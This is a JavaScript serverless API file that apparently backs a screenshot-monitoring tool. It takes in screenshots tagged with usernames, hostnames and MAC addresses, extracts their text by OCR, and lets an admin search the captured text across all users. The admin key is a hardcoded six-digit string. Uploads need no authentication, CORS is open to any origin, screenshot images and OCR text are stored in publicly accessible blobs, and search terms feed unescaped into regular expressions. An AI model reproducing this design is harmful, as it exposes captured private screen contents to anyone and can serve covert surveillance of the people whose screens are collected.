// api/clipboard.js - Screenshot Clipboard Management API with OCR Text Extraction
import { put, del, list } from '@vercel/blob';

// Hardcoded admin key for clipboard access
const HARDCODED_ADMIN_KEY = "122316";

// Validate admin access for clipboard viewing
function validateClipboardAccess(req) {
    const adminKey = req.headers['x-admin-key'] || req.body?.adminKey;
    return adminKey === HARDCODED_ADMIN_KEY;
}

// Validate regular admin access (for MAC management)
function validateAdminAccess(req) {
    const adminKey = req.headers['x-admin-key'] || req.body?.adminKey;
    const ADMIN_SECRET_KEY = process.env.ADMIN_SECRET_KEY || "default-admin-key-change-this";
    return adminKey === ADMIN_SECRET_KEY;
}

// Generate unique screenshot ID
function generateScreenshotId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
}

// OCR Text Extraction using Google Cloud Vision API
async function extractTextFromImage(imageBuffer) {
    try {
        // Using Google Cloud Vision API
        const visionApiKey = process.env.GOOGLE_VISION_API_KEY;
        if (!visionApiKey) {
            console.warn('Google Vision API key not found, skipping OCR');
            return { text: '', confidence: 0 };
        }

        const base64Image = imageBuffer.toString('base64');
        
        const response = await fetch(`https://vision.googleapis.com/v1/images:annotate?key=${visionApiKey}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                requests: [{
                    image: {
                        content: base64Image
                    },
                    features: [{
                        type: 'TEXT_DETECTION',
                        maxResults: 1
                    }]
                }]
            })
        });

        if (!response.ok) {
            throw new Error(`Vision API error: ${response.status}`);
        }

        const result = await response.json();
        
        if (result.responses && result.responses[0] && result.responses[0].textAnnotations) {
            const textAnnotation = result.responses[0].textAnnotations[0];
            return {
                text: textAnnotation.description || '',
                confidence: textAnnotation.confidence || 0,
                boundingPoly: textAnnotation.boundingPoly
            };
        }

        return { text: '', confidence: 0 };
        
    } catch (error) {
        console.error('OCR extraction failed:', error);
        return { text: '', confidence: 0, error: error.message };
    }
}

// Alternative OCR using Tesseract.js (fallback)
async function extractTextWithTesseract(imageBuffer) {
    try {
        // This would require Tesseract.js to be available
        // For serverless functions, we'll use a simpler approach
        console.log('Tesseract OCR not implemented in serverless environment');
        return { text: '', confidence: 0 };
    } catch (error) {
        console.error('Tesseract OCR failed:', error);
        return { text: '', confidence: 0, error: error.message };
    }
}

// In-memory storage for clipboard index with OCR data
let clipboardIndex = {
    users: {},
    totalScreenshots: 0,
    lastUpdated: null,
    totalTextExtracted: 0
};

export default async function handler(req, res) {
    // Handle CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Admin-Key');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    const { action } = req.query;
    
    try {
        switch (action) {
            case 'upload-screenshot':
                return await handleScreenshotUpload(req, res);
            case 'list-users':
                return await handleListUsers(req, res);
            case 'get-user-screenshots':
                return await handleGetUserScreenshots(req, res);
            case 'get-screenshot-text':
                return await handleGetScreenshotText(req, res);
            case 'search-text':
                return await handleSearchText(req, res);
            case 'delete-screenshot':
                return await handleDeleteScreenshot(req, res);
            case 'clear-user-clipboard':
                return await handleClearUserClipboard(req, res);
            case 'get-stats':
                return await handleGetStats(req, res);
            case 'health':
                return await handleHealthCheck(req, res);
            default:
                return res.status(400).json({
                    success: false,
                    message: 'Invalid action. Available: upload-screenshot, list-users, get-user-screenshots, get-screenshot-text, search-text, delete-screenshot, clear-user-clipboard, get-stats, health'
                });
        }
    } catch (error) {
        console.error('Clipboard API Error:', error);
        return res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
}

// Handle screenshot upload with OCR text extraction
async function handleScreenshotUpload(req, res) {
    const { 
        userId, 
        username, 
        deviceId, 
        hostname, 
        platform, 
        accessType, 
        timestamp, 
        macAddresses, 
        imageData,
        sessionInfo,
        extractText = true // Option to enable/disable OCR
    } = req.body;

    if (!userId || !imageData || !username) {
        return res.status(400).json({
            success: false,
            message: 'Missing required fields: userId, username, imageData'
        });
    }

    try {
        const screenshotId = generateScreenshotId();
        
        // Convert base64 to buffer
        const imageBuffer = Buffer.from(imageData, 'base64');
        
        console.log(`Processing screenshot ${screenshotId} for user ${userId}`);
        
        // Extract text from image using OCR
        let ocrResult = { text: '', confidence: 0 };
        if (extractText) {
            console.log('Starting OCR text extraction...');
            ocrResult = await extractTextFromImage(imageBuffer);
            console.log(`OCR completed. Text length: ${ocrResult.text.length}, Confidence: ${ocrResult.confidence}`);
        }
        
        // Upload original image to Vercel Blob
        const fileName = `screenshots/${userId}/${screenshotId}.png`;
        const blob = await put(fileName, imageBuffer, {
            access: 'public',
            contentType: 'image/png',
        });
        
        // Also store extracted text as a separate file
        if (ocrResult.text) {
            const textFileName = `text/${userId}/${screenshotId}.txt`;
            const textBlob = await put(textFileName, ocrResult.text, {
                access: 'public',
                contentType: 'text/plain',
            });
            console.log(`Text extracted and stored: ${textBlob.url}`);
        }

        // Update in-memory clipboard index
        if (!clipboardIndex.users[userId]) {
            clipboardIndex.users[userId] = {
                username: username,
                deviceInfo: {
                    hostname: hostname,
                    platform: platform,
                    deviceId: deviceId,
                    macAddresses: macAddresses
                },
                screenshots: [],
                firstSeen: new Date().toISOString(),
                lastActive: new Date().toISOString(),
                totalScreenshots: 0,
                totalTextExtracted: 0
            };
        }

        // Add screenshot with OCR data to user's clipboard
        const screenshotEntry = {
            id: screenshotId,
            filename: fileName,
            timestamp: timestamp || Date.now(),
            uploadedAt: new Date().toISOString(),
            accessType: accessType,
            sessionInfo: sessionInfo || {},
            size: imageBuffer.length,
            blobUrl: blob.url,
            // OCR data
            extractedText: ocrResult.text || '',
            textConfidence: ocrResult.confidence || 0,
            textWordCount: ocrResult.text ? ocrResult.text.split(/\s+/).length : 0,
            hasText: Boolean(ocrResult.text),
            ocrError: ocrResult.error || null
        };

        clipboardIndex.users[userId].screenshots.push(screenshotEntry);
        clipboardIndex.users[userId].lastActive = new Date().toISOString();
        clipboardIndex.users[userId].totalScreenshots++;
        
        if (ocrResult.text) {
            clipboardIndex.users[userId].totalTextExtracted++;
            clipboardIndex.totalTextExtracted++;
        }
        
        // Keep only last 50 screenshots per user to manage storage
        if (clipboardIndex.users[userId].screenshots.length > 50) {
            const oldScreenshots = clipboardIndex.users[userId].screenshots.splice(0, clipboardIndex.users[userId].screenshots.length - 50);
            
            // Delete old files from Blob
            for (const oldScreenshot of oldScreenshots) {
                try {
                    await del(oldScreenshot.blobUrl);
                    // Also delete text file if it exists
                    const oldTextFileName = `text/${userId}/${oldScreenshot.id}.txt`;
                    try {
                        await del(oldTextFileName);
                    } catch (e) {
                        // Text file might not exist
                    }
                } catch (error) {
                    console.log(`Could not delete old files: ${oldScreenshot.filename}`);
                }
            }
        }

        clipboardIndex.totalScreenshots++;
        clipboardIndex.lastUpdated = new Date().toISOString();

        console.log(`Screenshot processed successfully: ${screenshotId}`);

        return res.status(200).json({
            success: true,
            message: 'Screenshot uploaded and processed successfully',
            data: {
                screenshotId: screenshotId,
                userId: userId,
                blobUrl: blob.url,
                extractedText: ocrResult.text,
                textConfidence: ocrResult.confidence,
                wordCount: ocrResult.text ? ocrResult.text.split(/\s+/).length : 0,
                hasText: Boolean(ocrResult.text),
                textPreview: ocrResult.text ? ocrResult.text.substring(0, 100) + (ocrResult.text.length > 100 ? '...' : '') : null
            }
        });

    } catch (error) {
        console.error('Upload error:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to upload and process screenshot',
            error: error.message
        });
    }
}

// Sync in-memory data with blob storage (enhanced for OCR)
async function syncUserDataFromBlobs() {
    try {
        const { blobs } = await list();
        
        // Extract unique user IDs from screenshot blob paths
        const userIds = [...new Set(
            blobs
                .filter(blob => blob.pathname.startsWith('screenshots/'))
                .map(blob => blob.pathname.split('/')[1])
                .filter(userId => userId && userId !== '')
        )];

        // Sync each user's data
        for (const userId of userIds) {
            const userBlobs = blobs.filter(blob => 
                blob.pathname.startsWith(`screenshots/${userId}/`)
            );
            
            const userTextBlobs = blobs.filter(blob => 
                blob.pathname.startsWith(`text/${userId}/`)
            );

            // If user doesn't exist in memory, create them
            if (!clipboardIndex.users[userId]) {
                clipboardIndex.users[userId] = {
                    username: userId, // fallback
                    deviceInfo: {},
                    screenshots: [],
                    firstSeen: userBlobs.length > 0 ? userBlobs[userBlobs.length - 1].uploadedAt : new Date().toISOString(),
                    lastActive: userBlobs.length > 0 ? userBlobs[0].uploadedAt : new Date().toISOString(),
                    totalScreenshots: userBlobs.length,
                    totalTextExtracted: userTextBlobs.length
                };
            }

            // Sync screenshots from blobs to memory
            clipboardIndex.users[userId].screenshots = await Promise.all(
                userBlobs
                    .sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt))
                    .map(async (blob) => {
                        const fileName = blob.pathname.split('/').pop();
                        const screenshotId = fileName.replace('.png', '');
                        
                        // Check if there's extracted text for this screenshot
                        const textBlob = userTextBlobs.find(tb => 
                            tb.pathname === `text/${userId}/${screenshotId}.txt`
                        );
                        
                        let extractedText = '';
                        if (textBlob) {
                            try {
                                const textResponse = await fetch(textBlob.url);
                                if (textResponse.ok) {
                                    extractedText = await textResponse.text();
                                }
                            } catch (e) {
                                console.log(`Could not fetch text for ${screenshotId}`);
                            }
                        }
                        
                        return {
                            id: screenshotId,
                            filename: blob.pathname,
                            timestamp: new Date(blob.uploadedAt).getTime(),
                            uploadedAt: blob.uploadedAt,
                            accessType: 'Unknown',
                            sessionInfo: {},
                            size: blob.size,
                            blobUrl: blob.url,
                            extractedText: extractedText,
                            textConfidence: extractedText ? 0.8 : 0, // Fallback confidence
                            textWordCount: extractedText ? extractedText.split(/\s+/).length : 0,
                            hasText: Boolean(extractedText)
                        };
                    })
            );

            clipboardIndex.users[userId].totalScreenshots = userBlobs.length;
            clipboardIndex.users[userId].totalTextExtracted = userTextBlobs.length;
        }

        clipboardIndex.totalScreenshots = blobs.filter(blob => blob.pathname.startsWith('screenshots/')).length;
        clipboardIndex.totalTextExtracted = blobs.filter(blob => blob.pathname.startsWith('text/')).length;
        clipboardIndex.lastUpdated = new Date().toISOString();

    } catch (error) {
        console.error('Error syncing user data from blobs:', error);
    }
}

// Get extracted text for a specific screenshot
async function handleGetScreenshotText(req, res) {
    if (!validateClipboardAccess(req)) {
        return res.status(403).json({
            success: false,
            message: 'Clipboard access denied. Correct admin key required.'
        });
    }

    const { screenshotId, userId } = req.query;
    if (!screenshotId || !userId) {
        return res.status(400).json({
            success: false,
            message: 'screenshotId and userId parameters required'
        });
    }

    try {
        await syncUserDataFromBlobs();

        if (!clipboardIndex.users[userId]) {
            return res.status(404).json({
                success: false,
                message: 'User not found'
            });
        }

        const screenshot = clipboardIndex.users[userId].screenshots.find(s => s.id === screenshotId);
        
        if (!screenshot) {
            return res.status(404).json({
                success: false,
                message: 'Screenshot not found'
            });
        }

        return res.status(200).json({
            success: true,
            message: 'Screenshot text retrieved successfully',
            data: {
                screenshotId: screenshotId,
                userId: userId,
                extractedText: screenshot.extractedText || '',
                textConfidence: screenshot.textConfidence || 0,
                wordCount: screenshot.textWordCount || 0,
                hasText: screenshot.hasText || false,
                uploadedAt: screenshot.uploadedAt,
                size: screenshot.size
            }
        });
    } catch (error) {
        console.error('Error fetching screenshot text:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to retrieve screenshot text',
            error: error.message
        });
    }
}

// Search through extracted text
async function handleSearchText(req, res) {
    if (!validateClipboardAccess(req)) {
        return res.status(403).json({
            success: false,
            message: 'Clipboard access denied. Correct admin key required.'
        });
    }

    const { query: searchQuery, userId } = req.query;
    if (!searchQuery) {
        return res.status(400).json({
            success: false,
            message: 'query parameter required'
        });
    }

    try {
        await syncUserDataFromBlobs();

        let searchResults = [];
        const searchTerm = searchQuery.toLowerCase();

        // Search in specific user or all users
        const usersToSearch = userId ? [userId] : Object.keys(clipboardIndex.users);

        for (const uId of usersToSearch) {
            if (!clipboardIndex.users[uId]) continue;

            const userScreenshots = clipboardIndex.users[uId].screenshots.filter(screenshot => {
                return screenshot.extractedText && 
                       screenshot.extractedText.toLowerCase().includes(searchTerm);
            });

            searchResults.push(...userScreenshots.map(screenshot => ({
                ...screenshot,
                userId: uId,
                username: clipboardIndex.users[uId].username,
                matchHighlight: getTextHighlight(screenshot.extractedText, searchTerm)
            })));
        }

        // Sort by relevance (more matches = higher relevance)
        searchResults.sort((a, b) => {
            const aMatches = (a.extractedText.toLowerCase().match(new RegExp(searchTerm, 'g')) || []).length;
            const bMatches = (b.extractedText.toLowerCase().match(new RegExp(searchTerm, 'g')) || []).length;
            return bMatches - aMatches;
        });

        return res.status(200).json({
            success: true,
            message: `Found ${searchResults.length} screenshots containing "${searchQuery}"`,
            data: {
                searchQuery: searchQuery,
                results: searchResults,
                totalResults: searchResults.length,
                searchedUsers: usersToSearch.length
            }
        });
    } catch (error) {
        console.error('Error searching text:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to search text',
            error: error.message
        });
    }
}

// Helper function to highlight search matches
function getTextHighlight(text, searchTerm, contextLength = 100) {
    if (!text || !searchTerm) return '';
    
    const index = text.toLowerCase().indexOf(searchTerm.toLowerCase());
    if (index === -1) return text.substring(0, contextLength);
    
    const start = Math.max(0, index - contextLength / 2);
    const end = Math.min(text.length, index + searchTerm.length + contextLength / 2);
    
    return text.substring(start, end);
}

// Enhanced list users with OCR stats
async function handleListUsers(req, res) {
    if (!validateClipboardAccess(req)) {
        return res.status(403).json({
            success: false,
            message: 'Clipboard access denied. Correct admin key required.'
        });
    }

    try {
        await syncUserDataFromBlobs();

        const userList = Object.entries(clipboardIndex.users).map(([userId, userData]) => ({
            userId: userId,
            username: userData.username,
            deviceInfo: userData.deviceInfo,
            totalScreenshots: userData.screenshots.length,
            totalTextExtracted: userData.totalTextExtracted || 0,
            textExtractionRate: userData.screenshots.length > 0 ? 
                ((userData.totalTextExtracted || 0) / userData.screenshots.length * 100).toFixed(1) + '%' : '0%',
            firstSeen: userData.firstSeen,
            lastActive: userData.lastActive,
            latestScreenshot: userData.screenshots.length > 0 ? 
                userData.screenshots[0].uploadedAt : null
        }));

        return res.status(200).json({
            success: true,
            message: 'Users retrieved successfully',
            data: {
                users: userList,
                totalUsers: userList.length,
                totalScreenshots: clipboardIndex.totalScreenshots,
                totalTextExtracted: clipboardIndex.totalTextExtracted,
                overallTextExtractionRate: clipboardIndex.totalScreenshots > 0 ?
                    ((clipboardIndex.totalTextExtracted / clipboardIndex.totalScreenshots) * 100).toFixed(1) + '%' : '0%'
            }
        });
    } catch (error) {
        console.error('Error listing users:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to retrieve users',
            error: error.message
        });
    }
}

// Enhanced get user screenshots with text data
async function handleGetUserScreenshots(req, res) {
    if (!validateClipboardAccess(req)) {
        return res.status(403).json({
            success: false,
            message: 'Clipboard access denied. Correct admin key required.'
        });
    }

    const { userId } = req.query;
    if (!userId) {
        return res.status(400).json({
            success: false,
            message: 'userId parameter required'
        });
    }

    try {
        await syncUserDataFromBlobs();

        if (!clipboardIndex.users[userId]) {
            return res.status(404).json({
                success: false,
                message: 'User not found'
            });
        }

        const userData = clipboardIndex.users[userId];

        return res.status(200).json({
            success: true,
            message: 'User screenshots retrieved successfully',
            data: {
                userId: userId,
                username: userData.username,
                deviceInfo: userData.deviceInfo,
                screenshots: userData.screenshots.map(screenshot => ({
                    ...screenshot,
                    textPreview: screenshot.extractedText ? 
                        screenshot.extractedText.substring(0, 100) + 
                        (screenshot.extractedText.length > 100 ? '...' : '') : null
                })),
                totalScreenshots: userData.screenshots.length,
                totalTextExtracted: userData.totalTextExtracted || 0,
                textExtractionRate: userData.screenshots.length > 0 ? 
                    ((userData.totalTextExtracted || 0) / userData.screenshots.length * 100).toFixed(1) + '%' : '0%'
            }
        });
    } catch (error) {
        console.error('Error fetching user screenshots:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to retrieve user screenshots',
            error: error.message
        });
    }
}

// Delete specific screenshot (enhanced to also delete text files)
async function handleDeleteScreenshot(req, res) {
    if (!validateClipboardAccess(req)) {
        return res.status(403).json({
            success: false,
            message: 'Clipboard access denied. Correct admin key required.'
        });
    }

    const { screenshotId, userId } = req.method === 'DELETE' ? req.query : req.body;
    if (!screenshotId || !userId) {
        return res.status(400).json({
            success: false,
            message: 'screenshotId and userId required'
        });
    }

    try {
        await syncUserDataFromBlobs();

        if (!clipboardIndex.users[userId]) {
            return res.status(404).json({
                success: false,
                message: 'User not found'
            });
        }

        const screenshotIndex = clipboardIndex.users[userId].screenshots.findIndex(s => s.id === screenshotId);
        
        if (screenshotIndex === -1) {
            return res.status(404).json({
                success: false,
                message: 'Screenshot not found'
            });
        }

        const screenshot = clipboardIndex.users[userId].screenshots[screenshotIndex];
        
        // Delete from Blob storage
        try {
            await del(screenshot.blobUrl);
            
            // Also delete text file if it exists
            const textFileName = `text/${userId}/${screenshotId}.txt`;
            try {
                await del(textFileName);
            } catch (e) {
                // Text file might not exist, that's okay
            }
        } catch (error) {
            console.log(`Could not delete screenshot files: ${screenshot.filename}`);
        }

        // Update counters
        if (screenshot.hasText) {
            clipboardIndex.users[userId].totalTextExtracted--;
            clipboardIndex.totalTextExtracted--;
        }

        // Remove from index
        clipboardIndex.users[userId].screenshots.splice(screenshotIndex, 1);
        clipboardIndex.users[userId].totalScreenshots--;
        clipboardIndex.totalScreenshots--;
        clipboardIndex.lastUpdated = new Date().toISOString();

        return res.status(200).json({
            success: true,
            message: 'Screenshot and associated text deleted successfully'
        });

    } catch (error) {
        console.error('Error deleting screenshot:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to delete screenshot',
            error: error.message
        });
    }
}

// Clear all screenshots for a user (enhanced for text files)
async function handleClearUserClipboard(req, res) {
    if (!validateClipboardAccess(req)) {
        return res.status(403).json({
            success: false,
            message: 'Clipboard access denied. Correct admin key required.'
        });
    }

    const { userId } = req.body;
    if (!userId) {
        return res.status(400).json({
            success: false,
            message: 'userId required'
        });
    }

    try {
        await syncUserDataFromBlobs();

        if (!clipboardIndex.users[userId]) {
            return res.status(404).json({
                success: false,
                message: 'User not found'
            });
        }

        const screenshots = clipboardIndex.users[userId].screenshots;
        const screenshotCount = screenshots.length;
        const textCount = clipboardIndex.users[userId].totalTextExtracted || 0;
        
        // Delete all files from Blob for this user
        for (const screenshot of screenshots) {
            try {
                await del(screenshot.blobUrl);
                
                // Also delete text file
                const textFileName = `text/${userId}/${screenshot.id}.txt`;
                try {
                    await del(textFileName);
                } catch (e) {
                    // Text file might not exist
                }
            } catch (error) {
                console.log(`Could not delete files: ${screenshot.filename}`);
            }
        }

        // Update counters
        clipboardIndex.totalScreenshots -= screenshotCount;
        clipboardIndex.totalTextExtracted -= textCount;
        clipboardIndex.users[userId].screenshots = [];
        clipboardIndex.users[userId].totalScreenshots = 0;
        clipboardIndex.users[userId].totalTextExtracted = 0;
        clipboardIndex.lastUpdated = new Date().toISOString();

        return res.status(200).json({
            success: true,
            message: `Cleared ${screenshotCount} screenshots and ${textCount} text extractions for user ${userId}`
        });

    } catch (error) {
        console.error('Error clearing user clipboard:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to clear user clipboard',
            error: error.message
        });
    }
}

// Get enhanced statistics with OCR data
async function handleGetStats(req, res) {
    if (!validateClipboardAccess(req)) {
        return res.status(403).json({
            success: false,
            message: 'Clipboard access denied. Correct admin key required.'
        });
    }

    try {
        await syncUserDataFromBlobs();

        const stats = {
            totalUsers: Object.keys(clipboardIndex.users).length,
            totalScreenshots: clipboardIndex.totalScreenshots,
            totalTextExtracted: clipboardIndex.totalTextExtracted,
            textExtractionRate: clipboardIndex.totalScreenshots > 0 ? 
                ((clipboardIndex.totalTextExtracted / clipboardIndex.totalScreenshots) * 100).toFixed(1) + '%' : '0%',
            lastUpdated: clipboardIndex.lastUpdated,
            userStats: Object.entries(clipboardIndex.users).map(([userId, userData]) => ({
                userId,
                username: userData.username,
                screenshotCount: userData.screenshots.length,
                textExtractedCount: userData.totalTextExtracted || 0,
                textExtractionRate: userData.screenshots.length > 0 ? 
                    ((userData.totalTextExtracted || 0) / userData.screenshots.length * 100).toFixed(1) + '%' : '0%',
                lastActive: userData.lastActive,
                deviceInfo: userData.deviceInfo
            }))
        };

        return res.status(200).json({
            success: true,
            message: 'Statistics retrieved successfully',
            data: stats
        });
    } catch (error) {
        console.error('Error getting stats:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to retrieve statistics',
            error: error.message
        });
    }
}

// Enhanced health check
async function handleHealthCheck(req, res) {
    try {
        await syncUserDataFromBlobs();
        
        return res.status(200).json({
            success: true,
            message: 'OCR-enhanced Clipboard API is healthy',
            timestamp: new Date().toISOString(),
            totalUsers: Object.keys(clipboardIndex.users).length,
            totalScreenshots: clipboardIndex.totalScreenshots,
            totalTextExtracted: clipboardIndex.totalTextExtracted,
            ocrEnabled: Boolean(process.env.GOOGLE_VISION_API_KEY),
            features: ['screenshot-upload', 'text-extraction', 'text-search', 'admin-management']
        });
    } catch (error) {
        return res.status(500).json({
            success: false,
            message: 'Health check failed',
            error: error.message
        });
    }
}
